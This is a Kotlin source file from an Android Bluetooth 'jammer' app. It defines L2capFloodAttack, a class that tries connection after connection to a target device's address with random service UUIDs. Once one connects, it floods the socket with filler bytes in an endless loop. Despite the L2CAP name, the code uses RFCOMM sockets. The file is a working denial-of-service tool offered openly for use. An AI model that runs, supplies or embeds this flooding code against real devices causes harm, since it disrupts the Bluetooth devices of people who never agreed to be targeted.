package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.os.Build
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.*
import java.io.IOException
import java.util.*
import util.Logger

class L2capFloodAttack(private val targetAddress: String) {
    private var bluetoothAdapter: BluetoothAdapter? = null
    private var l2capSocket: BluetoothSocket? = null
    private var coroutineScope: CoroutineScope? = null

    // Per-instance stop flag. Marked @Volatile because it is written from the
    // UI thread (stopAttack) and read from the IO coroutine.
    @Volatile
    private var running = false

    // Purge oldest messages if the line count exceeds 100
    private fun purgeOldestMessagesIfNeeded(element: TextView) {
        val maxLines = 100
        val lines = element.text.split("\n")
        if (lines.size > maxLines) {
            val newText = lines.takeLast(maxLines).joinToString("\n")
            element.text = newText
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    @SuppressLint("MissingPermission")
    fun startAttack(context: Context, element: MaterialTextView) {
        val scope = CoroutineScope(Dispatchers.IO)
        coroutineScope = scope
        running = true

        val bluetoothManager: BluetoothManager? =
            getSystemService(context, BluetoothManager::class.java)
        bluetoothAdapter = bluetoothManager?.adapter
        val device: BluetoothDevice = bluetoothAdapter?.getRemoteDevice(targetAddress) ?: return

        scope.launch {
            val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
            var uuid = baseUUID
            var connected = false

            // Keep trying to connect until we succeed or are asked to stop.
            // The stop checks here are what let the Stop button actually work.
            while (isActive && running && AttackActivity.isAttacking && !connected) {
                try {
                    val socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                    l2capSocket = socket
                    socket.connect()
                    connected = socket.isConnected
                } catch (err: IOException) {
                    // Connection failed (or the socket was closed by stopAttack).
                    // Pick a fresh random UUID and try again on the next loop.
                    uuid = UUID.fromString(
                        UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                    )
                    log(context, element, "Failed to connect, retrying…")
                }
            }

            if (connected && isActive && running && AttackActivity.isAttacking) {
                log(context, element, "Connection established. Sending payload…")
                floodAttack()
            }
        }
    }

    private fun floodAttack() {
        val dataSize = l2capSocket?.maxTransmitPacketSize ?: 600
        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }

        try {
            while (running && AttackActivity.isAttacking && l2capSocket?.isConnected == true) {
                l2capSocket?.outputStream?.write(sendBuffer)
            }
        } catch (e: IOException) {
            // Socket was closed (most likely by stopAttack) — stop quietly.
        }
    }

    @SuppressLint("MissingPermission")
    fun stopAttack() {
        running = false
        // Closing the socket unblocks any in-flight connect()/write() call so the
        // coroutine can exit immediately instead of running until force-close.
        closeConnection()
        coroutineScope?.cancel()
        coroutineScope = null
        l2capSocket = null
    }

    private fun closeConnection() {
        try {
            l2capSocket?.close()
        } catch (e: IOException) {
            // ignore — we are tearing down anyway
        }
    }

    private fun log(context: Context, element: MaterialTextView, message: String) {
        if (!AttackActivity.loggingStatus) return
        if (context is AttackActivity) {
            context.runOnUiThread {
                if (running && AttackActivity.isAttacking) {
                    purgeOldestMessagesIfNeeded(element)
                    Logger.appendLog(element, message)
                }
            }
        }
    }
}
